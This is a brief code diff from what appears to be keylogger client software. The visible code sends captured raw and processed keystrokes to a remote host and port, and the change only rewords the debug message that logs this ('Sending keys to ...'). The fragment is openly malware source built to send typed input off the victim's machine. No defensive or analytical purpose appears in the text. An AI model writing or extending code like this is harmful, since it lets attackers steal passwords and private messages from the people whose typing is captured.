@@ -77,7 +77,7 @@ class Client:
                     self.send_message(f"r{prefix} {''.join(word)}")
                     self.send_message(f"p{prefix} {''.join(word_processed)}")
                     self.debug_message("KEYLOGGER",
-                                       f"Sent {prefix}r/p | {''.join(word)} / {''.join(word_processed)} | to {self.host}:{self.port}")
+                                       f"Sending keys to {self.host}:{self.port}: {prefix}r/p | {''.join(word)} / {''.join(word_processed)}")
                     break
 
                 key_substitution_map = {"uppil": "↑",
